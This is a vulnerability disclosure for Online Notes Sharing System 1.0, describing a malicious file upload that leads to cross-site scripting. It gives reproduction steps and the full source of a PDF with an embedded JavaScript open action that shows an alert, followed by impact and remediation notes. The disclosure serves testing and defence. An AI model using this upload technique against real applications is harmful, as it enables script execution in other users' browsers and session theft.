## Online Notes Sharing System

**Bug Description:**

A vulnerability in the Online Notes Sharing System 1.0 allows an attacker to upload a malicious file, leading to a Cross-Site Scripting (XSS) attack. The issue arises due to insufficient validation of file uploads, enabling an attacker to upload a pdf file containing XSS payload.

Steps to Reproduce:

```
# Exploit Title: Malicious File Upload Leads to XSS in Online Notes Sharing System
# Date: 20-12-2023
# Exploit Author: dhabaleshwardas
# Vendor Homepage: https://phpgurukul.com/
# Software Link: https://phpgurukul.com/online-notes-sharing-system-using-php-and-mysql/
# Version: 1.0
# Tested on: firefox/chrome/brave
# CVE:
```
To exploit the vulnerability:

1- Log in to the application and navigate to /user/add-notes.php endpoint.

2- Add anything random in the "Notes title", "Subject" and "Description" now click on "Upload File" and upload a file called "xss.pdf". The file here is a file which I created and injected malicious content into it. Here I wrote the code for the file, make sure to copy it and then save it as "xss.pdf".

```
%PDF-1.3
%����
1 0 obj
<</Pages 2 0 R /Type /Catalog>>
endobj
2 0 obj
<</Count 1 /Kids [3 0 R] /Type /Pages>>
endobj
3 0 obj
<</AA
  <</O
  <</JS
  (
try {
  app.alert\("Hacked By DD"\)
} catch \(e\) {
  app.alert\(e.message\);
}
    ) 
  /S /JavaScript>>>>
  /Annots [] /Contents 4 0 R /MediaBox [0 0 612 792] /Parent 2 0 R
  /Resources
  <</Font <</F1 <</BaseFont /Helvetica /Subtype /Type1 /Type /Font>>>>>>
  /Type /Page>>
endobj
4 0 obj
<</Length 21>>
stream
 
BT
/F1 24 Tf
ET
    
endstream
endobj
xref
0 5
0000000000 65535 f
0000000015 00000 n
0000000062 00000 n
0000000117 00000 n
0000000424 00000 n
trailer

<</Root 1 0 R /Size 5>>
startxref
493
%%EOF

```

3- Submit the file, and it gets uploaded to the server. Now click on "Edit" on the "Note" where you added your malicious pdf.

<img width="953" alt="2" src="https://github.com/dhabaleshwar/Open-Source-Vulnerabilities/assets/132373212/e19137d4-458c-415f-a4f0-acdea6c3074c">



4- Access the uploaded file after clicking on "View".

<img width="958" alt="3" src="https://github.com/dhabaleshwar/Open-Source-Vulnerabilities/assets/132373212/b3bf37f2-a235-4dbf-b704-4d2b0af66cd0">


5- The XSS payload within the malicious file gets executed in the context of the user's browser, leading to a successful XSS attack.

<img width="797" alt="4" src="https://github.com/dhabaleshwar/Open-Source-Vulnerabilities/assets/132373212/64ebe311-eb57-4226-ba64-a7fb948a7e2d">



## Impact:

This vulnerability allows an attacker to upload a file with malicious content, leading to the execution of XSS payloads. The attacker can potentially steal sensitive information, compromise user sessions, or perform other malicious actions within the application.

## Remediation:

1- Perform content inspection on uploaded files to detect and prevent the inclusion of malicious code.

2- Use antivirus or anti-malware tools to scan uploaded files for potential threats.
